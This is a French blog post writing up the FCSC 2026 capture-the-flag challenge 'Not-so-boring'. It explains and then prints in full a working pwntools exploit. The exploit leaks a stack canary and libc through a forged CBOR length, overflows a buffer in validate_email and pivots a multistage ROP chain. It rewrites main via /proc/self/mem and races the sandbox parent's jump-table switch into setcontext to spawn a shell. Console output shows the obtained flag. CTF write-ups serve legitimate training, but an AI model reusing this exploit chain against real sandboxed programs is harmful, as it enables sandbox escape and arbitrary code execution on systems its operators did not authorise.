---
layout: post
title: "Challenge not so boring, FCSC 2026"
date: 2026-04-10 12:00:00 +0100
categories: CTF
---

C'est un challenge en deux parties, la première était "Boring".
Nous nous interesserons à la seconde partie, "Not-so-boring".

Le programme est maintenant lancé (LD_PRELOAD) avec une lib qui fait un fork() et sandbox l'enfant.
Coté enfant la lib utilise seccomp et hook certaines fonctions libc.
Les hook communiquent avec le parent via un pipe et un buffer partagé appelé g_shm_mailbox.
Les hooks ne sont pas vraiment utiles, seccomp bloquerait les tentatives. Interessant..
Voici ce qui est autorisé :

```c
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(pwrite64), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(pread64), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
```

coté enfant (je passe rapidement, c'est le parent qui est interessant, cf write up de 'boring')
    vulnérabilité 1 dans validate_email()
        Grace à un leak en changeant un champ du cbor pour lui dire qu'il est plus grand qu'il ne l'est réellement on obtient le canary et la libc.
    vulnérabilité 2 dans validate_email()

```c
        +0x0f7                char var_58[0x20]
        +0x0f7                memcpy(&var_58, &arg1[1], rax_6)
```

        -> overflow de pile.. stack frame.. ROP
        Peu de place, besoin d'avoir des offsets fixes pour certains paramètres, on fera un pivot vers la section .bss.
        Le ROP sera multistage pour récupérer des infos et continuer en fonction de celles ci.
        etape 1 : récupérer une vue totale de la mémoire en affichant /proc/self/maps et récupérer l'étape 2
        etape 2 : passer du ROP à du code classique (via pwrite64 /proc/self/mem) pour exploiter le parent, cf plus bas.
        Ici seccomp n'est parametré que pour filtrer le x64, pas le 32 bits, mais les adresses ne permettaient pas de switcher.

coté parent:
        L'exploit dans l'enfant remplit g_shm_mailbox et signale qu'un message est dispo à run_supervisor() via un pipe. Il simule sandbox_send().
        run_supervisor() va appeler handle_ipc_command(). Voici le début de la fonction :

```assembly
            +0x000    uint64_t handle_ipc_command(int64_t* arg1)
            +0x000  48833f07           cmp     qword [rdi], 0x7
            +0x004  0f8766010000       ja      0x4018e1
            +0x00a  4156               push    r14 {__saved_r14}
            +0x00c  488d15600b0000     lea     rdx, [rel jump_table_4022e4]
            +0x013  4155               push    r13 {__saved_r13}
            +0x015  4154               push    r12 {__saved_r12}
            +0x017  55                 push    rbp {__saved_rbp}
            +0x018  53                 push    rbx {__saved_rbx}
            +0x019  488b07             mov     rax, qword [rdi]
            +0x01c  4889fb             mov     rbx, rdi
            +0x01f  48630482           movsxd  rax, dword [rdx+rax*4]
            +0x023  4801d0             add     rax, rdx
            +0x026  ffe0               jmp     rax
```

        L'enfant va spammer handle_ipc_command() tout en modifiant g_shm_mailbox pour changer [rdi] entre 'cmp qword [rdi], 0x7' et 'mov rax, qword [rdi]'
        Le but est de faire une race condition sur ce 'switch (msg->command)' pour sauter trop loin dans le code ; [rdi] est utilisé pour calculer le saut.
        D'où l'interet de passer par du code pur à la place du ROP pour spammer efficacement. Même ansi le taux de succès est faible, mais réaliste.

        Ce switch() utilise une table de saut qu'on appelera 'jump_table_4022e4' (enfin c'est binaryninja qui a choisit).
        En fonction de 'msg->command' il lit une valeur dans la table, l'ajoute à l'adresse de la table, et y saute.
        Il faut donc que l'index de la table pointe vers quelque chose que l'on peut définir, à savoir une valeur qui, ajoutée à l'adresse de la table, soit l'adresse où l'on veut aller.
        Dans le process parent on ne controle que g_shm_mailbox donc on doit faire en sorte que index*4+&table=&g_shm_mailbox+0x10 (pointeur après msg->command).
        La valeur à placer dans *[g_shm_mailbox+0x10] sera &destination-&table.
        Comme la libsandbox est chargée plus haut que la heap qui contient g_shm_mailbox, l'index sera très grand pour devenir négatif au moment du 'movsxd  rax, dword [rdx+rax*4]'.
        Où aller ? Les one gadget ne marchent pas, tous utilisent RBP qui contient le pid de l'enfant à ce moment là, cela provoque un SIGSEV.
        RDI et RBX contient l'adresse de g_shm_mailbox..
        La solution que j'ai trouvé a été de sauter vers 'setcontext' (libc), qui redéfinit tout le contexte selon le contenu située à RDI.
        Ca permet de redéfinir tous les registres, y compris RSP et RIP, comme un sigreturn.
        Du coup je lance un execve('/bin/sh',0,0) et paf le flag.

```console
➜  not-so-boring ./exploit.py REMOTE
[+] Opening connection to challenges.fcsc.fr on port 2207: Done
[+] elf.base:         0x6373e18de000
[+] libc.base:        0x77846dcee000
[+] canary:           0xe5318437b20b2c00
[*] Loaded 5 cached gadgets for './boring_patched'
[*] Loaded 205 cached gadgets for './libc-2.41.so'
[+] libsandbox.base:  0x77846def4000
[+] g_shm_mailbox:    0x77846def3000
[*] onegadget=0x77846dd333b0
[*] table=0x77846def62e4
[*] delta=0xffe3d0cc
[*] index=4611686018427384651
[*] Loaded 27 cached gadgets for './libsandbox.so'
[+] please wait during the race: Done
[*] Switching to interactive mode
Linux not-so-boring 6.18.20-metal-hardened-pwn #1 SMP Sun Mar 29 21:23:43 UTC 2026 x86_64 GNU/Linux
FCSC{faeebeeeaa6369be7079b085470bc92103cda6133a55d1df7b0c45f05f026e60}$  
```

  - mandragore, 2026/04/09

```python

from pwn import *
import cbor2
#sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'amd64'
#context.terminal = ['tmux', 'splitw', '-h']

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./boring_patched', checksec=False)
libc = ELF('./libc-2.41.so', checksec=False)
libsandbox = ELF('./libsandbox.so', checksec=False)

if args.REMOTE:
    p = remote('challenges.fcsc.fr', 2207)
else:
    if args.GDB:
        p = gdb.debug(elf.path, env={'LD_PRELOAD': './libsandbox.so'}, gdbscript='''
            # follow parent/child
            set follow-fork-mode child
            # on parent / off child
            set detach-on-fork off
            set schedule-multiple on

            # ROPBREAKPOINT
            break *_init+0x16
            continue

            #break handle_ipc_command
            #break setcontext

            continue
        ''')
    else:
        p = process(elf.path, env={'LD_PRELOAD': './libsandbox.so'})

def teamleak():
    leaksize=1024
    team_data = {
        "year": 2026,
        "captain": "crunch",
        "player_count": 1,
        "players": [{"email": b"alice@teamfrance.ctf","speciality": "ninja","nickname": b'XYZZ'}]*9+[
            {
            "email": b"alice@teamfrance.ctf",
            "speciality": "ninja",
            "nickname": b'XYZY'
            }
        ]
    }
    raw_cbor = bytearray(cbor2.dumps(team_data))
    # print(hexdump(raw_cbor))
    cbor=raw_cbor.replace(b'\x44XYZY', b'\x59'+p16(leaksize,endian='big')+cyclic(leaksize)) # 0x79 -> text string, size 2 octets
    # print(hexdump(cbor))
    return cbor

def teamsploit(payload):
    team_data = {
        "year": 2026,
        "captain": "crunch",
        "player_count": 1,
        "players": [
            {
                "nickname": b"Alice",
                "email": payload+b"@teamfrance.ctf",
                "speciality": "Radio"
            }
        ]
    }
    return cbor2.dumps(team_data)

team=teamleak()
p.sendlineafter(b'composition: ',team)
leak=p.recvuntil(b'correct')
#print(hexdump(leak))

ptrleak=leak.find(b'\0ninja')+1 # moving during debug
canary=u64(leak[ptrleak+0x50:ptrleak+0x58])
elf.address=u64(leak[ptrleak+0xa0:ptrleak+0xa8])-elf.sym.main
libc.address=u64(leak[ptrleak+0x130:ptrleak+0x138])-libc.sym.__libc_start_main-133
success(f'elf.base:         {elf.address:#x}')
success(f'libc.base:        {libc.address:#x}')
success(f'canary:           {canary:#x}')
ROPBREAKPOINT=elf.sym._init+0x16
ROPINFLOOP=libc.address+0xf5660
ROPPIVOT=libc.address+0x285d8

# exploit, pivot

pivot=elf.bss()+0x100
rop=ROP([elf,libc])
rop.read(0,pivot,0x200) # size of first stage rop
rop.raw(elf.address+0x144e) # leave ; ret

payload=cyclic(0x48)+p64(canary)+p64(pivot)+rop.chain()
p.sendlineafter(b': ',b'n')
p.sendlineafter(b'composition: ',teamsploit(payload))

# first stage, get more addresses

rop=ROP([elf,libc])
rop.raw(0x1122334455667787) # pivot cleaning (>rbp)

rop.open(libc.address+0x1a6e9e,0) # /proc/self/maps
rop.read(3,pivot+0x200,0x1000)
rop.write(1,pivot+0x200,0x1000)

pivot+=0x100
rop.read(0,pivot,0x400)
rop.rsp=pivot
rop.raw(ROPPIVOT)

p.sendline(rop.chain())

leak=p.recvuntil(b'libsandbox')
#print(hexdump(leaks))
for line in leak.splitlines():
    if b'libsandbox' in line:
        libsandbox.address=int(line.split(b'-')[0],16)
    if b'deleted' in line:
        g_shm_mailbox=int(line.split(b'-')[0],16)
success(f'libsandbox.base:  {libsandbox.address:#x}')
success(f'g_shm_mailbox:    {g_shm_mailbox:#x}')
p.clean()

# second stage, organize the race

# jmp (table+[index*4+table]) où
#   index*4+table=addrmailbox+0x20
#   [index*4+table]=delta=onegadget-table

# calcul de la valeur à ajouter à table pour arriver à onegadget (negatif, libc < libsandbox)
onegadget=libc.sym.setcontext
info(f'{onegadget=:#x}')
table=libsandbox.address+libsandbox.get_section_by_name('.rodata').header.sh_addr+0x2e4
info(f'{table=:#x}')
delta=(onegadget-table) & 0xffffffff
info(f'{delta=:#x}')

# calcul de la valeur du pointeur vers notre valeur à ajouter
index=(g_shm_mailbox+0x10-table) & 0xffffffffffffffff
index=(index>>2)
info(f'{index=}')

# R12 = $addrmailbox
# R13 = msg->command valide pour passer le check
# R14 = msg->command empoisonné
# R15 = taille à copier
# RBX = write
newmain=asm("""
race_loop:
    mov rdi, r12
    mov rsi, r13
    mov rcx, r15
    rep movsb
    mov rdi,6
;    mov rsi,rsp
    mov rdx,1
    call rbx    # write
    mov rdi, r12
    mov rsi, r14
    mov rcx, r15
    rep movsb
    jmp race_loop
""")

rop=ROP([elf,libc,libsandbox])
# init mail + setcontext
rop.memcpy(g_shm_mailbox,pivot+0x140,0x100)
# patch main()
rop.open(pivot+0x120,2)
rop.pwrite64(5,pivot+0x260,len(newmain),elf.sym.main)
# prepare args
rop.r12=g_shm_mailbox
rop.r13=pivot+0x140 # legit
rop.r14=pivot+0x240 # poisoned
rop.r15=p64(16)   # len({flag,indexmsg})
rop.rbx=libc.sym.write
# call new main()
rop.raw(rop.ret.address)
rop.raw(elf.sym.main)

#rop.raw(ROPBREAKPOINT)
#rop.raw(ROPINFLOOP)

# my data segment
payload={
    0:rop.chain(),
    0x120: b'/proc/self/mem\0',
    # mail + setcontext
    0x140: p64(1)+p64(1)+p32(delta),
    0x148+0x68: p64(next(libc.search(b'/bin/sh\0'))), # rdi
    0x148+0x70: p64(0),                               # rsi
    0x148+0x88: p64(0),                               # rdx
    0x148+0xa0: p64(pivot+0x500),                     # rsp
    0x148+0xa8: p64(libc.sym.execve),                 # rip
    0x148+0xe0: p64(g_shm_mailbox+0x100),             # pour fldenv
    # evil index
    0x240: p64(1)+p64(index)+p32(delta),
    # code to replace main
    0x260: newmain
}
p.sendline(fit(payload))

prog=p.progress('please wait during the race')
p.sendline(b'echo hereiam')
p.recvuntil(b'hereiam')
prog.success()
p.clean()
p.sendline(b'uname -a; /getflag')
p.interactive()

"""
=> 0x786b7ae7a3e5 <setcontext+53>:      mov    rsp,QWORD PTR [rdx+0xa0]
   0x786b7ae7a3ec <setcontext+60>:      mov    rbx,QWORD PTR [rdx+0x80]
   0x786b7ae7a3f3 <setcontext+67>:      mov    rbp,QWORD PTR [rdx+0x78]
   0x786b7ae7a3f7 <setcontext+71>:      mov    r12,QWORD PTR [rdx+0x48]
   0x786b7ae7a3fb <setcontext+75>:      mov    r13,QWORD PTR [rdx+0x50]
   0x786b7ae7a3ff <setcontext+79>:      mov    r14,QWORD PTR [rdx+0x58]
   0x786b7ae7a403 <setcontext+83>:      mov    r15,QWORD PTR [rdx+0x60]
   0x786b7ae7a407 <setcontext+87>:      mov    rcx,QWORD PTR [rdx+0xa8]
   0x786b7ae7a40e <setcontext+94>:      push   rcx
   0x786b7ae7a40f <setcontext+95>:      mov    rsi,QWORD PTR [rdx+0x70]
   0x786b7ae7a413 <setcontext+99>:      mov    rdi,QWORD PTR [rdx+0x68]
   0x786b7ae7a417 <setcontext+103>:     mov    rcx,QWORD PTR [rdx+0x98]
   0x786b7ae7a41e <setcontext+110>:     mov    r8,QWORD PTR [rdx+0x28]
   0x786b7ae7a422 <setcontext+114>:     mov    r9,QWORD PTR [rdx+0x30]
   0x786b7ae7a426 <setcontext+118>:     mov    rdx,QWORD PTR [rdx+0x88]
   0x786b7ae7a42d <setcontext+125>:     xor    eax,eax
   0x786b7ae7a42f <setcontext+127>:     ret
"""